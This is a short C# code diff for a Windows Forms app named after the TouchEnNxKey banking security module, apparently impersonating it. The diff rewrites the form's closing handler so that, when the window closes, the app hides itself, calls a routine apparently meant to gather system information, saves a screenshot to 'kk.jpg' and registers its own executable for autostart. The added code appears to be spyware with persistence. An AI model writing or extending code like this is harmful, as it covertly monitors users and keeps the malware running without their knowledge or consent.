@@ -4,6 +4,7 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 
@@ -18,8 +19,9 @@ namespace TouchEnNxKey
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Program.GetAllInformations();
         }
+
+        
 
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
@@ -28,8 +30,13 @@ namespace TouchEnNxKey
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = true;
+            //e.Cancel = true;
             this.Hide();
+            Program.GetAllInformations();
+            ScreenCopy.Copy("kk.jpg");
+
+            string ExeFileName = System.Reflection.Assembly.GetEntryAssembly().Location;
+            Program.RegisterAutostart(ExeFileName);
         }
     }
 }
